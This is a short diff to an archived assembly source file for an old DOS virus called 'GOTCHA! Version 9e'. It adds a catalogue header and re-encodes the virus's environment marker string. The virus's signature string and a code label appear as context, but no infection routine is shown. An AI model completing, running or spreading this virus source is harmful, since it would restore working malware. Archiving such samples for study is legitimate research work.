@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      G
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;****************************************************************************
 ;*              GOTCHA!  Version 9e
 ;****************************************************************************
@@ -557,7 +568,7 @@ cancel:         pop     es
 ;*              Text and Signature
 ;****************************************************************************
 
-envstring:      db      'E=mc�',0               ;put this in your environment!
+envstring:      db      'E=mc�',0               ;put this in your environment!
 
 signature:      db      'GOTCHA!',0             ;I have got you!  :-)
 signend:
